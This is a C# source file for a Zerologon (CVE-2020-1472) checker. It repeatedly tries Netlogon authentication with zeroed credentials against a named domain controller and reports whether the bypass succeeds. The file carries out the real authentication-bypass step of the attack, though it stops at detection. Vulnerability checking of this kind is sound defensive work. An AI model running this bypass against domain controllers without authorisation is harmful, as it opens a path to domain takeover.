using System;
using static ZeroLogonCheck.Netapi32;

namespace ZeroLogonCheck
{
    public class ZeroLogon
    {
        //static void recap()
        //{
        //    Console.Clear();
        //    Console.WriteLine("\n");
        //    Console.WriteLine("[+] ZeroLogonCheck By Cyril Pineiro, based on Zerologon Exploit");
        //    Console.WriteLine("[+] Check Your server Against CVE-2020-1472");
        //    Console.WriteLine("[+] Published @=> https://github.com/CPO-EH");
        //    Console.WriteLine("[+] Usage: ZeroLogonChecker.exe [Target DC]");
        //    Console.WriteLine("\n");
        //}

        /// <summary>
        /// 
        /// </summary>
        /// <param name="args"></param>
        public ZeroLogon(string[] args)
        {
            //recap();

            string Remote_Host = args[0];

            while (!Remote_Host.Contains("."))
            {
                Console.WriteLine("[-] Please provide FQDN :");
                Remote_Host = Console.ReadLine();
                Console.Clear();
            }

            string Remote_HostName = args[0].Split('.')[0];

            NETLOGON_CREDENTIAL ClientChallenge = new NETLOGON_CREDENTIAL();
            NETLOGON_CREDENTIAL ServerChallenge = new NETLOGON_CREDENTIAL();

            ulong NegotiateFlags = 0x212fffff;

            Console.WriteLine("[+] Begining auth attempts...");

            Console.Write("[+] Working... ");

            Console.CursorVisible = false;

            int counter = 0;

            Console.WriteLine("\n\n");

            var currConsoleColor = Console.ForegroundColor;

            for (int i = 0; i < 2000; i++)
            {
                counter++;
                switch (counter % 4)
                {
                    case 0: Console.Write(" /"); counter = 0; break;
                    case 1: Console.Write(" -"); break;
                    case 2: Console.Write(" \\"); break;
                    case 3: Console.Write(" |"); break;
                }
                Console.SetCursorPosition(Console.CursorLeft - 2, Console.CursorTop);

                if (I_NetServerReqChallenge(Remote_Host, Remote_HostName, ref ClientChallenge, ref ServerChallenge) != 0)
                {
                    Console.WriteLine("[-] Could not complete server challenge. Could be invalid name provided or network issues\n");
                    return;
                }

                if (I_NetServerAuthenticate2(Remote_Host, Remote_HostName + "$", NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                    Remote_HostName, ref ClientChallenge, ref ServerChallenge, ref NegotiateFlags) == 0)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[+] DC is vulnerable to Zerologon attack.\n");
                    Console.ForegroundColor = currConsoleColor;
                    return;
                }
            }
            Console.CursorVisible = true;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] DC appear to not be vulnerable to Zerologon attack.\n");
            Console.ForegroundColor = currConsoleColor;
        }
    }
}
